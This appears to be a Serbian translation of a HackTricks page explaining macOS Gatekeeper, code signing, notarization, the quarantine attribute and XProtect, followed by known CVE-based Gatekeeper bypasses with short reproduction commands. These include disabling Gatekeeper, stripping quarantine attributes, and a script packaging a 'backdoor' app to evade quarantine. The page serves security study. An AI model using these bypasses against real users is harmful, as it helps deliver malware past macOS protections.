# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repo-u**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo-u**](https://github.com/carlospolop/hacktricks-cloud)
*
* .

</details>

## Gatekeeper

**Gatekeeper** je sigurnosna funkcija razvijena za Mac operativne sisteme, dizajnirana da osigura da korisnici **pokreću samo pouzdan softver** na svojim sistemima. Ona funkcioniše tako što **validira softver** koji korisnik preuzima i pokušava da otvori sa **izvora van App Store-a**, kao što je aplikacija, dodatak ili instalacioni paket.

Ključni mehanizam Gatekeeper-a leži u njegovom **verifikacionom** procesu. On proverava da li je preuzeti softver **potpisan od strane priznatog razvijaca**, obezbeđujući autentičnost softvera. Takođe, utvrđuje da li je softver **notarisan od strane Apple-a**, potvrđujući da je lišen poznatog zlonamernog sadržaja i da nije bio izmenjen nakon notarizacije.

Dodatno, Gatekeeper pojačava kontrolu i sigurnost korisnika tako što **traži od korisnika odobrenje za otvaranje** preuzetog softvera prvi put. Ova zaštita pomaže u sprečavanju korisnika da nenamerno pokrenu potencijalno štetan izvršni kod koji su mogli da pomisle da je bezopasan podatkovni fajl.

### Potpisi aplikacija

Potpisi aplikacija, takođe poznati kao kodni potpisi, su ključna komponenta Apple-ove sigurnosne infrastrukture. Koriste se za **verifikaciju identiteta autora softvera** (razvijaca) i za osiguranje da kod nije bio izmenjen od poslednjeg potpisivanja.

Evo kako to funkcioniše:

1. **Potpisivanje aplikacije:** Kada razvijac želi da distribuira svoju aplikaciju, on **potpisuje aplikaciju koristeći privatni ključ**. Taj privatni ključ je povezan sa **sertifikatom koji Apple izdaje razvijacu** kada se prijavi za Apple Developer Program. Proces potpisivanja uključuje kreiranje kriptografskog heša svih delova aplikacije i enkripciju ovog heša privatnim ključem razvijaca.
2. **Distribucija aplikacije:** Potpisana aplikacija se zatim distribuira korisnicima zajedno sa sertifikatom razvijaca, koji sadrži odgovarajući javni ključ.
3. **Verifikacija aplikacije:** Kada korisnik preuzme i pokuša da pokrene aplikaciju, Mac operativni sistem koristi javni ključ iz sertifikata razvijaca da dekriptuje heš. Zatim ponovo izračunava heš na osnovu trenutnog stanja aplikacije i upoređuje ga sa dekriptovanim hešom. Ako se poklapaju, to znači da **aplikacija nije izmenjena** od trenutka kada ju je razvijac potpisao, i sistem dozvoljava pokretanje aplikacije.

Potpisi aplikacija su važan deo Apple-ove Gatekeeper tehnologije. Kada korisnik pokuša da **otvori aplikaciju preuzetu sa interneta**, Gatekeeper proverava potpis aplikacije. Ako je potpisana sertifikatom koji je Apple izdao poznatom razvijacu i kod nije bio izmenjen, Gatekeeper dozvoljava pokretanje aplikacije. U suprotnom, blokira aplikaciju i obaveštava korisnika.

Počevši od macOS Catalina, **Gatekeeper takođe proverava da li je aplikacija notarizovana** od strane Apple-a, dodajući dodatni sloj sigurnosti. Proces notarizacije proverava aplikaciju na poznate sigurnosne probleme i zlonamerni kod, i ako ove provere prođu, Apple dodaje tiket aplikaciji koji Gatekeeper može da verifikuje.

#### Provera potpisa

Kada proveravate neki **uzorak zlonamernog softvera**, uvek biste trebali **proveriti potpis** binarnog koda, jer se **razvijac** koji ga je potpisao može već **povezivati** sa **zlonamernim softverom**.

```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```

### Notarizacija

Apple-ov proces notarizacije služi kao dodatna zaštita korisnika od potencijalno štetnog softvera. Uključuje **razvojničko podnošenje njihove aplikacije na pregled** od strane **Apple-ove Notary usluge**, koja se ne sme mešati sa pregledom aplikacija. Ova usluga je **automatizovani sistem** koji detaljno pregleda podneti softver u potrazi za **zlonamernim sadržajem** i mogućim problemima sa potpisivanjem koda.

Ako softver **prođe** ovu inspekciju bez izazivanja bilo kakvih zabrinutosti, Notary usluga generiše notarizacijski tiket. Razvojnička osoba je zatim obavezna da **priloži ovaj tiket svom softveru**, proces poznat kao 'stapling'. Osim toga, notarizacijski tiket se takođe objavljuje na mreži gde Gatekeeper, Apple-ova tehnologija za bezbednost, može da mu pristupi.

Prilikom prvog instaliranja ili pokretanja softvera od strane korisnika, postojanje notarizacijskog tiketa - bilo da je prikačen za izvršnu datoteku ili pronađen na mreži - **obaveštava Gatekeeper da je softver notarizovan od strane Apple-a**. Kao rezultat toga, Gatekeeper prikazuje opisnu poruku u dijalogu za početno pokretanje, ukazujući da je softver prošao provere na prisustvo zlonamernog sadržaja od strane Apple-a. Ovaj proces tako poboljšava poverenje korisnika u bezbednost softvera koji instaliraju ili pokreću na svojim sistemima.

### Enumeracija GateKeeper-a

GateKeeper je i **nekoliko komponenti za bezbednost** koje sprečavaju izvršavanje nepouzdanih aplikacija i takođe **jedna od tih komponenti**.

Moguće je videti **status** GateKeeper-a pomoću:

```bash
# Check the status
spctl --status
```

{% hint style="danger" %}
Napomena da se provjere potpisa GateKeeper-a vrše samo nad **datotekama sa karantenskim atributom**, a ne nad svakom datotekom.
{% endhint %}

GateKeeper će provjeriti da li se prema **postavkama i potpisu** može izvršiti binarna datoteka:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

Baza podataka koja čuva ovu konfiguraciju nalazi se u **`/var/db/SystemPolicy`**. Možete provjeriti ovu bazu podataka kao root korisnik koristeći:

```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```

Primetite kako se pravilo završava sa "**App Store**", a drugo sa "**Developer ID**", i da je u prethodnoj slici omogućeno izvršavanje aplikacija sa App Store-a i identifikovanih programera.\
Ako **izmenite** tu postavku na App Store, pravila za "**Notarized Developer ID**" će nestati.

Takođe postoje hiljade pravila tipa GKE:

```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```

Ovo su heševi koji potiču iz **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** i **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Ili možete navesti prethodne informacije sa:

```bash
sudo spctl --list
```

Opcije **`--master-disable`** i **`--global-disable`** alata **`spctl`** će potpuno **onemogućiti** ove provere potpisa:

```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```

Kada je potpuno omogućeno, pojaviće se nova opcija:

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

Moguće je **proveriti da li će aplikacija biti dozvoljena od strane GateKeeper-a** pomoću:

```bash
spctl --assess -v /Applications/App.app
```

Moguće je dodati nove pravila u GateKeeper kako bi se omogućilo izvršavanje određenih aplikacija sa:

```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```

### Karantin fajlovi

Prilikom **preuzimanja** aplikacije ili fajla, određene macOS **aplikacije** kao što su web pregledači ili email klijenti **dodaju prošireni atribut fajla**, poznat kao "**karantin oznaka**", preuzetom fajlu. Ovaj atribut služi kao sigurnosna mera koja označava fajl kao dolazeći sa nepouzdanih izvora (internet) i potencijalno nosi rizike. Međutim, ne sve aplikacije dodaju ovaj atribut, na primer, uobičajeni BitTorrent klijenti obično zaobilaze ovaj proces.

**Prisustvo karantin oznake signalizira sigurnosnu funkciju Gatekeeper-a macOS-a kada korisnik pokuša da izvrši fajl**.

U slučaju kada **karantin oznaka nije prisutna** (kao kod fajlova preuzetih putem nekih BitTorrent klijenata), Gatekeeper-ove **provere se možda neće izvršiti**. Stoga, korisnici trebaju biti oprezni prilikom otvaranja fajlova preuzetih sa manje sigurnih ili nepoznatih izvora.

{% hint style="info" %}
**Provera** validnosti **potpisa koda** je **resursno intenzivan** proces koji uključuje generisanje kriptografskih **heševa** koda i svih njegovih pridruženih resursa. Takođe, provera validnosti sertifikata uključuje **online proveru** na Apple-ovim serverima da bi se videlo da li je sertifikat povučen nakon izdavanja. Iz ovih razloga, potpuna provera potpisa koda i notarizacije je **neprikladna za pokretanje svaki put kada se pokrene aplikacija**.

Stoga, ove provere se **izvršavaju samo prilikom izvršavanja aplikacija sa karantin oznakom**.
{% endhint %}

{% hint style="warning" %}
Ovaj atribut mora biti **postavljen od strane aplikacije koja kreira/preuzima** fajl.

Međutim, fajlovi koji su sandbox-ovani će imati ovaj atribut postavljen za svaki fajl koji kreiraju. Aplikacije koje nisu sandbox-ovane mogu ga postaviti same ili specificirati ključ [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) u **Info.plist** datoteci, što će naterati sistem da postavi prošireni atribut `com.apple.quarantine` na kreirane fajlove.
{% endhint %}

Moguće je **proveriti njegov status i omogućiti/onemogućiti** (potreban je root pristup) sa:

```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```

Takođe možete **pronaći da li datoteka ima prošireni atribut karantina** pomoću:

```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```

Proverite **vrednost** **proširenih** **atributa** i saznajte koja je aplikacija napisala karantinski atribut pomoću:

```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```

Zapravo, proces "može postaviti karantinske oznake na datoteke koje kreira" (pokušao sam primeniti oznaku USER\_APPROVED na kreiranu datoteku, ali nije je primenio):

<details>

<summary>Izvorni kod primene karantinskih oznaka</summary>

\`\`\`c #include #include

enum qtn\_flags { QTN\_FLAG\_DOWNLOAD = 0x0001, QTN\_FLAG\_SANDBOX = 0x0002, QTN\_FLAG\_HARD = 0x0004, QTN\_FLAG\_USER\_APPROVED = 0x0040, };

\#define qtn\_proc\_alloc \_qtn\_proc\_alloc #define qtn\_proc\_apply\_to\_self \_qtn\_proc\_apply\_to\_self #define qtn\_proc\_free \_qtn\_proc\_free #define qtn\_proc\_init \_qtn\_proc\_init #define qtn\_proc\_init\_with\_self \_qtn\_proc\_init\_with\_self #define qtn\_proc\_set\_flags \_qtn\_proc\_set\_flags #define qtn\_file\_alloc \_qtn\_file\_alloc #define qtn\_file\_init\_with\_path \_qtn\_file\_init\_with\_path #define qtn\_file\_free \_qtn\_file\_free #define qtn\_file\_apply\_to\_path \_qtn\_file\_apply\_to\_path #define qtn\_file\_set\_flags \_qtn\_file\_set\_flags #define qtn\_file\_get\_flags \_qtn\_file\_get\_flags #define qtn\_proc\_set\_identifier \_qtn\_proc\_set\_identifier

typedef struct \_qtn\_proc \*qtn\_proc\_t; typedef struct \_qtn\_file \*qtn\_file\_t;

int qtn\_proc\_apply\_to\_self(qtn\_proc\_t); void qtn\_proc\_init(qtn\_proc\_t); int qtn\_proc\_init\_with\_self(qtn\_proc\_t); int qtn\_proc\_set\_flags(qtn\_proc\_t, uint32\_t flags); qtn\_proc\_t qtn\_proc\_alloc(); void qtn\_proc\_free(qtn\_proc\_t); qtn\_file\_t qtn\_file\_alloc(void); void qtn\_file\_free(qtn\_file\_t qf); int qtn\_file\_set\_flags(qtn\_file\_t qf, uint32\_t flags); uint32\_t qtn\_file\_get\_flags(qtn\_file\_t qf); int qtn\_file\_apply\_to\_path(qtn\_file\_t qf, const char \*path); int qtn\_file\_init\_with\_path(qtn\_file\_t qf, const char _path); int qtn\_proc\_set\_identifier(qtn\_proc\_t qp, const char_ bundleid);

int main() {

qtn\_proc\_t qp = qtn\_proc\_alloc(); qtn\_proc\_set\_identifier(qp, "xyz.hacktricks.qa"); qtn\_proc\_set\_flags(qp, QTN\_FLAG\_DOWNLOAD | QTN\_FLAG\_USER\_APPROVED); qtn\_proc\_apply\_to\_self(qp); qtn\_proc\_free(qp);

FILE \*fp; fp = fopen("thisisquarantined.txt", "w+"); fprintf(fp, "Hello Quarantine\n"); fclose(fp);

return 0;

}

````
</details>

I uklonite taj atribut sa:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
````

I pronađite sve karantinovane datoteke sa:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Informacije o karantinu takođe se čuvaju u centralnoj bazi podataka koju upravlja LaunchServices u **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

**Quarantine.kext**

Kernel ekstenzija je dostupna samo putem **kernel keša na sistemu**; međutim, _možete_ preuzeti **Kernel Debug Kit sa https://developer.apple.com/**, koji će sadržati simbolizovanu verziju ekstenzije.

#### XProtect

XProtect je ugrađena funkcija **anti-malware** u macOS-u. XProtect **proverava svaku aplikaciju kada se prvi put pokrene ili izmeni u odnosu na svoju bazu podataka** poznatih malvera i nesigurnih tipova fajlova. Kada preuzmete fajl putem određenih aplikacija, kao što su Safari, Mail ili Messages, XProtect automatski skenira fajl. Ako se poklapa sa nekim poznatim malverom u svojoj bazi podataka, XProtect će **sprečiti pokretanje fajla** i upozoriti vas na pretnju.

Baza podataka XProtect-a se **redovno ažurira** od strane Apple-a sa novim definicijama malvera, a ova ažuriranja se automatski preuzimaju i instaliraju na vašem Mac-u. Ovo osigurava da je XProtect uvek ažuriran sa najnovijim poznatim pretnjama.

Međutim, treba napomenuti da **XProtect nije potpuno opremljeno antivirusno rešenje**. On samo proverava određenu listu poznatih pretnji i ne vrši skeniranje prilikom pristupa kao većina antivirusnih softvera.

Možete dobiti informacije o poslednjem ažuriranju XProtect-a pokretanjem:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect se nalazi na SIP zaštićenoj lokaciji na **/Library/Apple/System/Library/CoreServices/XProtect.bundle** i unutar paketa možete pronaći informacije koje XProtect koristi:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Dozvoljava kod sa tim cdhash-ovima da koristi legacy privilegije.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Lista dodataka i ekstenzija koje su zabranjene za učitavanje putem BundleID-a i TeamID-a ili koje zahtevaju minimalnu verziju.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Yara pravila za otkrivanje malvera.
* **`XProtect.bundle/Contents/Resources/gk.db`**: SQLite3 baza podataka sa heševima blokiranih aplikacija i TeamID-ova.

Napomena da postoji još jedna aplikacija u **`/Library/Apple/System/Library/CoreServices/XProtect.app`** koja je povezana sa XProtect-om, ali nije uključena u Gatekeeper proces.

#### Ne Gatekeeper

Imajte na umu da Gatekeeper **se ne izvršava svaki put** kada pokrenete aplikaciju, samo će _**AppleMobileFileIntegrity**_ (AMFI) **proveriti potpise izvršnog koda** kada pokrenete aplikaciju koja je već pokrenuta i proverena od strane Gatekeeper-a.

Prethodno je bilo moguće pokrenuti aplikaciju da bi se keširala sa Gatekeeper-om, a zatim **izmeniti neizvršne fajlove aplikacije** (poput Electron asar ili NIB fajlova) i ako nisu postojale druge zaštite, aplikacija bi bila **izvršena** sa **zlonamernim** dodacima.

Međutim, sada to nije moguće jer macOS **sprečava izmenu fajlova** unutar paketa aplikacija. Dakle, ako pokušate napad [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), primetićete da više nije moguće zloupotrebiti ga jer nakon pokretanja aplikacije da biste je keširali sa Gatekeeper-om, nećete moći da izmenite paket. Ako, na primer, promenite ime direktorijuma Contents u NotCon (kako je naznačeno u eksploitu) i zatim pokrenete glavni binarni fajl aplikacije da biste je keširali sa Gatekeeper-om, izazvaće grešku i neće se izvršiti.

### Bypass-ovi Gatekeeper-a

Svaki način zaobilaženja Gatekeeper-a (uspevajući da naterate korisnika da preuzme nešto i izvrši ga kada bi Gatekeeper trebao da to zabrani) smatra se ranjivošću u macOS-u. Ovo su neki CVE-ovi dodeljeni tehnikama koje su u prošlosti omogućavale zaobilaženje Gatekeeper-a:

#### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Primećeno je da ako se koristi **Archive Utility** za ekstrakciju, fajlovi sa **putanjama dužim od 886 karaktera** ne dobijaju prošireni atribut com.apple.quarantine. Ova situacija nenamerno omogućava tim fajlovima da **zaobiđu sigurnosne provere Gatekeeper-a**.

Pogledajte [**originalni izveštaj**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) za više informacija.

#### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Kada se aplikacija kreira sa **Automator-om**, informacije o tome šta je potrebno za njeno izvršavanje nalaze se u `application.app/Contents/document.wflow`, a ne u izvršnom fajlu. Izvršni fajl je samo generički Automator binarni fajl nazvan **Automator Application Stub**.

Stoga, mogli biste da napravite da `application.app/Contents/MacOS/Automator\ Application\ Stub` **pokazuje simboličkim linkom na drugi Automator Application Stub unutar sistema** i izvršiće ono što se nalazi u `document.wflow` (vaš skript) **bez pokretanja Gatekeeper-a** jer stvarni izvršni fajl nema karantinski atribut.

Primer očekivane lokacije: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Pogledajte [**originalni izveštaj**](https://ronmasas.com/posts/bypass-macos-gatekeeper) za više informacija.

#### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

U ovom zaobilaženju je kreiran zip fajl sa aplikacijom koji počinje sa kompresijom od `application.app/Contents`, umesto od `application.app`. Stoga je **karantinski atribut** primenjen na sve **fajlove iz `application.app/Contents`**, ali **ne na `application.app`**, što je Gatekeeper proveravao, pa je Gatekeeper zaobiđen jer kada je `application.app` pokrenut, **nije imao karantinski atribut**.

```bash
zip -r test.app/Contents test.zip
```

Proverite [**originalni izveštaj**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) za više informacija.

#### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Čak i ako su komponente različite, iskorišćavanje ove ranjivosti je vrlo slično prethodnoj. U ovom slučaju ćemo generisati Apple arhiv iz **`application.app/Contents`** tako da **`application.app` neće dobiti karantinski atribut** kada se dekompresuje pomoću **Archive Utility**.

```bash
aa archive -d test.app/Contents -o test.app.aar
```

Proverite [**originalni izveštaj**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) za više informacija.

#### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** može se koristiti da se spreči bilo ko da upiše atribut u datoteku:

```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```

Osim toga, **AppleDouble** format datoteke kopira datoteku zajedno sa njenim ACE-ovima.

U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) je moguće videti da se ACL tekstualna reprezentacija koja je smeštena unutar xattr-a nazvanog **`com.apple.acl.text`** će biti postavljena kao ACL u dekompresovanoj datoteci. Dakle, ako ste kompresovali aplikaciju u zip datoteku sa **AppleDouble** formatom datoteke sa ACL-om koji sprečava pisanje drugih xattr-a na nju... karantinski xattr nije postavljen u aplikaciji:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Proverite [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.

Imajte na umu da se ovo takođe može iskoristiti pomoću AppleArchives:

```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```

#### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Otkriveno je da **Google Chrome nije postavljao atribut karantina** na preuzete datoteke zbog nekih internih problema u macOS-u.

#### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

Formati datoteka AppleDouble čuvaju atribute datoteke u posebnoj datoteci koja počinje sa `._`, što pomaže u kopiranju atributa datoteke **između macOS mašina**. Međutim, primijećeno je da nakon dekompresije AppleDouble datoteke, datoteka koja počinje sa `._` **nije dobila atribut karantina**.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Moguće je bilo zaobići Gatekeeper tako što se napravi datoteka koja neće imati postavljen atribut karantina. Trik je bio da se napravi aplikacija DMG datoteke koristeći AppleDouble konvenciju imena (početi sa `._`) i napraviti vidljivu datoteku kao simboličku vezu ka ovoj skrivenoj datoteci bez atributa karantina. Kada se izvrši DMG datoteka, pošto nema atribut karantina, zaobići će Gatekeeper.

```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```

#### Sprječavanje karantenskog xattr-a

U paketu ".app" ako karantenski xattr nije dodan, prilikom izvršavanja **Gatekeeper neće biti pokrenut**.



</details>
